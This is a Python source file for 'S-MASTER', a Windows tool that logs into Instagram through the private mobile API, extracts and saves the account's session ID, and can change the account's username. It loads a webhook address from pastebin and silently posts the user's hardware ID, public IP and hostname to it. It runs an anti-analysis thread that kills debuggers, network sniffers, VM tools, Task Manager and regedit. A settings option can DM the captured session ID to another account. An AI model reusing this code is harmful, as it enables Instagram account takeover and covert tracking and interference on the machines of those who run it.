import requests,ctypes,os,hashlib,urllib.parse,uuid,hmac,random,string,time,json,threading,psutil,socket,datetime;from colorama import Fore
import colorama
colorama.init()


#signes----------------------------------------------------

redline = Fore.RED + "────────────────────────────────────────────────────────────────────────────────────────────────────" + Fore.LIGHTWHITE_EX
inputed = Fore.LIGHTWHITE_EX + "  [" + Fore.BLUE + ">" + Fore.LIGHTWHITE_EX + "] "
sended = Fore.LIGHTWHITE_EX + "  [" + Fore.LIGHTGREEN_EX + "*" + Fore.LIGHTWHITE_EX + "] "
question = Fore.LIGHTWHITE_EX + "  [" + Fore.LIGHTMAGENTA_EX + "?" + Fore.LIGHTWHITE_EX + "] "
annowns = Fore.LIGHTWHITE_EX + "  [" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTWHITE_EX + "] "
msgFromProg = Fore.LIGHTWHITE_EX + "  [" + Fore.LIGHTYELLOW_EX + "~" + Fore.LIGHTWHITE_EX + "] "
infohash = Fore.LIGHTWHITE_EX + "  [" + Fore.LIGHTBLUE_EX + "#" + Fore.LIGHTWHITE_EX + "] "
added = Fore.LIGHTWHITE_EX + "  [" + Fore.GREEN + "+" + Fore.LIGHTWHITE_EX + "] "
error_ = Fore.LIGHTWHITE_EX + "  [" + Fore.RED + "ERROR" + Fore.LIGHTWHITE_EX + "] "

#signes----------------------------------------------------

#logo------------------------------------------------------

logo = f'''{Fore.YELLOW}
                 ███████╗      ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ 
                 ██╔════╝      ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
                 ███████╗█████╗██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝
                 ╚════██║╚════╝██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗
                 ███████║      ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║
                 ╚══════╝      ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                 {Fore.LIGHTGREEN_EX}Last update:4/9/2022    {Fore.LIGHTBLACK_EX}instagram Session-id extracter - by @hmzoa   
{redline}
'''
forbedinApp = [
            "Process Hacker.exe",
            "ProcessHacker.exe",
            "Hacker",
            "x64dbg",
            "debugger",
            "http",
            "HTTP",
            "IDA",
            "WinDbg",
            "Radare2",
            "wireshark",
            "shark",
            "fiddler",
            "mitm",
            "Detect it Easy",
            "DIT",
            "ExeInfoPE",
            "HxD",
            "ProcessExplorer",
            "Resource Hacker",
            "dnspy",
            "HandBrake",
            "httpdebuggerui.exe", 
            "wireshark.exe", 
            "HTTPDebuggerSvc.exe", 
            "fiddler.exe", 
            "regedit.exe", 
            "taskmgr.exe", 
            "vboxservice.exe", 
            "df5serv.exe", 
            "processhacker.exe", 
            "vboxtray.exe", 
            "vmtoolsd.exe", 
            "vmwaretray.exe", 
            "ida64.exe", 
            "ollydbg.exe",
            "pestudio.exe", 
            "vmwareuser", 
            "vgauthservice.exe", 
            "vmacthlp.exe", 
            "x96dbg.exe", 
            "vmsrvc.exe", 
            "x32dbg.exe", 
            "vmusrvc.exe", 
            "prl_cc.exe", 
            "prl_tools.exe", 
            "xenservice.exe", 
            "qemu-ga.exe", 
            "joeboxcontrol.exe", 
            "ksdumperclient.exe", 
            "ksdumper.exe",
            "joeboxserver.exe"
        ]
#logo------------------------------------------------------

class S_MASTER:
    def __init__(self):
        self.Tmode = 0
        self.sessionid = ''
        self.username_id = ''
        self.r = requests.session()
        self.uuid = str(uuid.uuid4())
        self.isloggedin = False
        self.username = ''
        self.password = ''
        self.headers = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US",
            "X-IG-Capabilities": "3brTvw==",
            "X-IG-Connection-Type": "WIFI",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 'Host': 'i.instagram.com',
            'Connection': 'keep-alive'
        }
        self.useragent = 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'
        self.IG_SIG_KEY = '109513c04303341a7daf27bb41b268e633b30dcc65a3fe14503f743176113869'
        self.urlsPaste     = requests.request("GET","https://pastebin.com/raw/2bx8n5Jy",headers={"user-agent":"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"}).json()
        self.good_ip_list  = requests.request("GET",self.urlsPaste['good-ip-list']     ,headers={"user-agent":"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"}).text
        self.black_list_ip = requests.request("GET",self.urlsPaste['black-list-ip']    ,headers={"user-agent":"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"}).text
        self.webhook       = self.urlsPaste['webhook']
        self.hwid          = os.popen('wmic csproduct get uuid').read().split("\n")[2].strip().replace("-","")
        self.toolUser      = ""
        threading.Thread(name='Anti-Debug', target=self.anti_debug).start()
        

    def menu(self):
        print(logo)
        self.Tmode = int(input(
            f'{inputed}Choose Grabbing Mode \n\n{redline}\n  ({Fore.LIGHTGREEN_EX}1{Fore.LIGHTWHITE_EX}) Single Account  ({Fore.LIGHTGREEN_EX}2{Fore.LIGHTWHITE_EX}) Get S-ID and Release User  ({Fore.LIGHTGREEN_EX}3{Fore.LIGHTWHITE_EX}) Multiple Account {Fore.LIGHTYELLOW_EX}:{Fore.LIGHTWHITE_EX} {Fore.LIGHTBLUE_EX}'))

        if self.Tmode == 1:# to extract single account session id from instagram
            self.singlesession()
            self.logout()
            os.system('exit')

        elif self.Tmode == 2:# to extract single account session id from instagram and change the username

            self.singlesession()
            if self.isloggedin:
                self.releaseUser()
                print(f'{Fore.LIGHTBLACK_EX}Enter to exit')
                input()
                os.system('exit')

        elif self.Tmode == 3:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(logo)
            print(f'{infohash}Not yet bro , Just wait few days . . . \n\n{redline+Fore.RED}soon{Fore.LIGHTWHITE_EX}')
            self.logout()
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            self.menu()

    def signature(self, data):
        body = (hmac.new(self.IG_SIG_KEY.encode("utf-8"), data.encode("utf-8"),
                         hashlib.sha256).hexdigest() + "." + urllib.parse.quote(data))
        signature = f"signed_body={body}&ig_sig_key_version=4"
        return signature.format(body=body)
    def generateDeviceId(self, seed):
        volatile_seed = "12345"
        m = hashlib.md5()
        m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
        return 'android-' + m.hexdigest()[:16]
    def generateUUID(self, type):
        generated_uuid = str(uuid.uuid4())
        if (type):
            return generated_uuid
        else:
            return generated_uuid.replace('-', '')

    def singlesession(self):

        os.system('cls')
        print(logo)
        self.username = input(f'{inputed}Enter Username : {Fore.LIGHTYELLOW_EX}')
        self.password = input(f'{inputed}Enter Password : {Fore.LIGHTYELLOW_EX}')
        print(Fore.LIGHTWHITE_EX)
        self.login()
        return
    def webHookMsg(self,text,title,color="RED"):
        data = {}
        Ecolor = 16777215
        if color == "RED":Ecolor = 16711680
        elif color == "GREEN":Ecolor = 65280 ; data["username"] = "NEW-USER"
        elif color == "BLUE":Ecolor = 1127128 ; data["username"] = "CHANGED"
        elif color == "LILAQ":Ecolor = 13148872 ; data["username"] = "BLACKLISTED"
        data["embeds"] = [
            {
                "description": f"{text}",
                "title": title,
                "color": Ecolor
            }
        ]
        requests.request("POST",url=self.webhook,json=data)
    def anti_debug(self):
        while True:
            for proc in psutil.process_iter():
                if any(procstr in proc.name().lower() for procstr in forbedinApp):
                    try:
                        self.webHookMsg(text = f"user Device ID (HWID) : {self.hwid} \n- Cracking Program: {proc.name()}\n- ip and host name : {requests.get(url='https://api.ipify.org/').text} | {str(socket.gethostname())}\n- tool : S-MASTER \n- date and time : {str(datetime.datetime.now()).split('.')[0]}",title="trying to crack")
                        proc.kill()
                        os.system('exit')
                    except(psutil.NoSuchProcess, psutil.AccessDenied): pass
            time.sleep(0.5)
    def checkIP(self):
        if self.hwid in self.good_ip_list and not self.hwid in self.black_list_ip:
            self.toolUser = json.loads(self.good_ip_list)[f"{self.hwid}"]
            return True
        elif self.hwid in self.good_ip_list and self.hwid in self.black_list_ip or self.hwid in self.black_list_ip:
            print(logo)
            print(f'{annowns}your Serial is {Fore.RED}BLACKLISTED{Fore.LIGHTWHITE_EX}.')
            print(f'{msgFromProg}you cant use this tool.')
            print(f'{msgFromProg}contact {Fore.LIGHTBLUE_EX}@hmzoa{Fore.LIGHTWHITE_EX} on instagram.') 
            try:
                 self.webHookMsg(text = f"user Device ID (HWID) : {self.hwid} \n- ip and host name : {requests.get(url='https://api.ipify.org/').text} | {str(socket.gethostname())}\n- tool : S-MASTER \n- date and time : {str(datetime.datetime.now()).split('.')[0]}",title="BLACK-LIST-USER",color="LILAQ")
            except:pass       
            return False
        else:
            print(logo)
            print(f'{annowns}your Serial is {Fore.RED}NOT{Fore.LIGHTWHITE_EX} activated.')
            print(f'{msgFromProg}contact {Fore.LIGHTBLUE_EX}@hmzoa{Fore.LIGHTWHITE_EX} on instagram.')
            print(f'{added}Device serial : [{Fore.LIGHTCYAN_EX}{self.hwid}{Fore.LIGHTWHITE_EX}]\n{Fore.LIGHTBLACK_EX} <copied to clipboard>')
            os.popen(f'echo {self.hwid}|clip')
            try:
                 self.webHookMsg(text = f"user Device ID (HWID) : {self.hwid} \n- ip and host name : {requests.get(url='https://api.ipify.org/').text} | {str(socket.gethostname())}\n- tool : S-MASTER \n- date and time : {str(datetime.datetime.now()).split('.')[0]}",title="trying to connect.",color="GREEN")
            except:pass
            return False
    def releaseUser(self):

        releaseTo = input(f'{question}Release {Fore.LIGHTMAGENTA_EX}@{self.username+Fore.LIGHTWHITE_EX} USERNAME To {Fore.LIGHTYELLOW_EX}:{Fore.LIGHTBLUE_EX} ')

        #get info to edit profile ----------------------------------------------------------------------
        pk = self.sessionid.split('%')[0]
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
            "X-CSRFtoken": "ZhhR4RZU5U9qxG8cOXZ8kj1Oq8fB5aH9"
        }
        posting = requests.get('https://www.instagram.com/accounts/edit/?__a=1&__d=dis',headers=headers,cookies=self.r.cookies)
        infoload = json.loads(posting.text)
        firstName   = infoload    ["form_data"]["first_name"]
        phoneNumber = infoload    ["form_data"]["phone_number"]
        biography   = infoload    ["form_data"]["biography"]
        gender      = str(infoload["form_data"]["gender"])
        email       = infoload    ["form_data"]["email"]
        externalUrl = infoload    ["form_data"]["external_url"]

        #get info to edit profile ----------------------------------------------------------------------

        editProfileData = {
            '_uuid': str(uuid.uuid4()),
            '_uid': pk,
            '_csrftoken' : 'missing',
            'first_name' : f'{firstName}',
            'is_private' : 'true',
            'phone_number' : f'{phoneNumber}',
            'biography' : f'{biography}' ,
            'username' : f'{releaseTo}' ,
            'gender' : f'{gender}',
            'email' : f'{email}',
            'external_url' : f'{externalUrl}'
        }
        ctypes.windll.user32.MessageBoxW(None, f'release user to {releaseTo}', 'release', 0)
        editReq = self.r.post("https://i.instagram.com/api/v1/accounts/edit_profile/", data=editProfileData,headers=self.r.cookies,cookies=self.r.cookies)

        if editReq.status_code == 200:
            ctypes.windll.user32.MessageBoxW(None, f'USERNAME released Successfully \nfrom {self.username} to {releaseTo}', 'Done!!', 0)
        elif "You need an email or confirmed phone number." in editReq.text:
            ctypes.windll.user32.MessageBoxW(None, f'You need an email\nor confirmed phone number to edit username.', 'confirm required!!', 0x30)
        elif "This username isn't available. Please try another." in editReq.text:
            ctypes.windll.user32.MessageBoxW(None, f'UserName <{releaseTo}> already taken', 'not available!!', 0x40)
        elif "Usernames can only use letters, numbers, underscores and periods." in editReq.text:
            ctypes.windll.user32.MessageBoxW(None, f'Usernames can only use:\nletters, numbers, underscores and periods.', 'illegal characters!!', 0)
        elif "Please wait a few minutes before you try again." in editReq.text:
            ctypes.windll.user32.MessageBoxW(None, f'rate limit reached\nPlease wait a few minutes before you try again.', 'RateLimit!!', 0x10)
        else:
            ctypes.windll.user32.MessageBoxW(None, f'somthing went wrong while releasing to {releaseTo}', 'ERROR!!', 0x10)

    def logout(self):
        print(f'\n\n{Fore.LIGHTBLACK_EX}Enter to exit')
        input()

        os.system('exit')

    def login(self):
        try:
            m = hashlib.md5()
            m.update(self.username.encode('utf-8') + self.password.encode('utf-8'))
            device_id = self.generateDeviceId(m.hexdigest())
            self.r.headers.update({
                'Connection': 'close',
                'Accept': '*/*',
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie2': '$Version=1',
                'Accept-Language': 'en-US',
                'User-Agent': self.useragent
            })
            response = requests.get('https://www.instagram.com')
            try:
                csrf = response.cookies['csrftoken']
            except:
                letters = string.ascii_lowercase;csrf = ''.join(random.choice(letters) for i in range(8))
            self.r.get('https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=' + self.generateUUID(False))
            data = {
                'phone_id': self.generateUUID(True),
                '_csrftoken': csrf,
                'username': self.username,
                'guid': self.generateUUID(True),
                'device_id': device_id,
                'password': self.password,
                'login_attempt_count': '0'
            }
            while True:
                try:
                    login = self.r.post('https://b.i.instagram.com/api/v1/accounts/login/',self.signature(json.dumps(data)));break

                except Exception as e:
                    print(e)
            self.Text = login.text

            try:
                self.Json = json.loads(login.text)
            except:
                self.Json = {}
            if 'logged_in_user' in login.text:
                self.sessionid = self.r.cookies["sessionid"]
                self.username_id = self.r.cookies['ds_user_id']
                self.isloggedin = True
                self.printinfo(session_id=self.sessionid,user_id=str(self.username_id))
                return True
            elif 'api_path' in self.Text:

                if not self.isloggedin:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(logo)
                    print(f'{annowns}Challenge code required!\n{redline}')
                    time.sleep(3)
                    if self.options():
                        for i in self.mode:
                            print(i)
                        print("\n"+redline)
                        choice = int(input(f"{question} Choose One:{Fore.LIGHTYELLOW_EX} "))
                        if self.sendcode(choice):
                            code = input(f"{inputed} Enter your 6 digit code:{Fore.LIGHTYELLOW_EX} ")
                            return self.entercode(code)
                else:
                    print(f'[{Fore.RED}ERROR{Fore.LIGHTWHITE_EX}] Your Account Is Challenge Locked!')
            elif 'The password you entered is incorrect' in self.Text:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(logo)
                print(f'{error_}Incorrect password!\n\n{redline}\n')
                return
            elif 'Please check your username and try again.' in self.Text:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(logo)
                print(f'{error_}Incorrect username!\n\n{redline}\n')
                return
            else:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(logo)
                print(f'{error_}{self.Text}')
                return
        except Exception as e:
            print(e)
    def entercode(self, myCode):
        CodeData = {
            'security_code': myCode,
            '_uuid': self.uuid,
            '_uid': self.uuid,
            '_csrftoken': 'missing'
        }
        Send_Code = self.r.post(self.url_api, headers=self.headers, data=CodeData)
        if 'logged_in_user' in Send_Code.text:
            loginJson = Send_Code.json()
            self.isloggedin = True
            self.username_id = loginJson["logged_in_user"]["pk"]
            self.sessionid = self.r.cookies["sessionid"]
            self.printinfo(session_id=self.sessionid,user_id=self.username_id)
            return True
        else:
            print(f'{error_} Failed code!')
            self.logout()
            return False
    def sendcode(self, myMode):
        SecureData = {
            'choice': myMode,
            '_uuid': self.uuid,
            '_uid': self.uuid,
            '_csrftoken': 'missing'
        }
        Send_Mode = self.r.post(self.url_api, headers=self.headers, data=SecureData).json()
        self.Send_Mode = Send_Mode
        if myMode == 0:
            try:
                self.pasw = Send_Mode['step_data']['contact_point'];return True
            except:
                return False
        try:
            self.pasw = Send_Mode['step_data']['contact_point'];return True
        except:
            return False

    def options(self):
        json = self.Json
        MyPATH = json['challenge']['api_path']
        self.url_api = 'https://i.instagram.com/api/v1' + MyPATH
        Secure = self.r.get(self.url_api, headers=self.headers)
        text = Secure.text
        self.mode = []
        if 'step_data' in text:
            if ('phone_number') in Secure.json()['step_data']:
                ema = Secure.json()['step_data']['phone_number']
                self.mode.append(f'{Fore.LIGHTWHITE_EX}<{Fore.LIGHTMAGENTA_EX}0{Fore.LIGHTWHITE_EX}> Phone: {Fore.LIGHTYELLOW_EX +ema}')
            if ('email') in Secure.json()['step_data']:
                ema = Secure.json()['step_data']['email']
                self.mode.append(f'{Fore.LIGHTWHITE_EX}<{Fore.LIGHTMAGENTA_EX}1{Fore.LIGHTWHITE_EX}> Email: {Fore.LIGHTBLUE_EX+ema}')

            if len(self.mode) > 0:
                return True
        return False

    def printinfo(self,session_id,user_id):
        os.system('cls' if os.name == 'nt' else 'clear')

        print(logo)
        with open(f'{self.username} S-ID.txt','w') as w:
            w.write(session_id)
        
        print(f'{msgFromProg}The Session-id for {Fore.LIGHTMAGENTA_EX}@{self.username + Fore.LIGHTWHITE_EX} is : {Fore.LIGHTBLUE_EX + session_id}')
        print(f'{msgFromProg}the username-id for {Fore.LIGHTMAGENTA_EX}@{self.username + Fore.LIGHTWHITE_EX} is : {Fore.LIGHTBLUE_EX +str(user_id)}')
        print("\n"+redline+"")
        with open('S-MASTER SETTING.json', 'r+') as f:
            data = json.load(f)
            if data['DM session-id']['send-or-not'] == True:
                if data['DM session-id']['send-to-self-account'] == True:# send dm msg to sid acc
                    self.r.request("POST",url="https://i.instagram.com/api/v1/direct_v2/threads/broadcast/text/",data=f'recipient_users=[{user_id}]&action=send_item&is_shh_mode=0&send_attribution=inbox_new_message&client_context=&text={str(session_id)}&device_id=android-8cd32a1ba6669cbe&mutation_token=&_uuid={uuid.uuid4}&offline_threading_id=')
                    self.r.request("POST",url="https://i.instagram.com/api/v1/direct_v2/threads/broadcast/text/",data=f'recipient_users=[{user_id}]&action=send_item&is_shh_mode=0&send_attribution=inbox_new_message&client_context=&text={str(datetime.datetime.now()).split(".")[0]}&device_id=android-8cd32a1ba6669cbe&mutation_token=&_uuid={uuid.uuid4}&offline_threading_id=')
                if data['DM session-id']['send-to-account'] != "":
                    sendTo_ID = requests.request("GET",url=f"https://www.instagram.com/{data['DM session-id']['send-to-account']}/?__a=1&__d=dis",headers={"user-agent":"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"},cookies=self.r.cookies).json()['graphql']['user']['id']
                    if data['DM session-id']["send-to-account-user-id"] == 123:
                        data['DM session-id']["send-to-account-user-id"] = sendTo_ID# get the user id with info api and dump it to file 
                    self.r.request("POST",url="https://i.instagram.com/api/v1/direct_v2/threads/broadcast/text/",data=f'recipient_users=[{sendTo_ID}]&action=send_item&is_shh_mode=0&send_attribution=inbox_new_message&client_context=&text={str(session_id)}&device_id=android-8cd32a1ba6669cbe&mutation_token=&_uuid={uuid.uuid4}&offline_threading_id=')
                    self.r.request("POST",url="https://i.instagram.com/api/v1/direct_v2/threads/broadcast/text/",data=f'recipient_users=[{sendTo_ID}]&action=send_item&is_shh_mode=0&send_attribution=inbox_new_message&client_context=&text={str(datetime.datetime.now()).split(".")[0]}&device_id=android-8cd32a1ba6669cbe&mutation_token=&_uuid={uuid.uuid4}&offline_threading_id=')
                f.seek(0)        
                json.dump(data, f, indent=4)
                f.truncate()
if __name__ == '__main__':
    try:ctypes.windll.kernel32.SetConsoleTitleW('S-MASTER - By @hmzoa - v2.1')
    except:""
    try:os.system('mode con: cols=100 lines=18')
    except:""
    app = S_MASTER()
    app.__init__()
    if app.checkIP():
        app.menu()
    app.logout()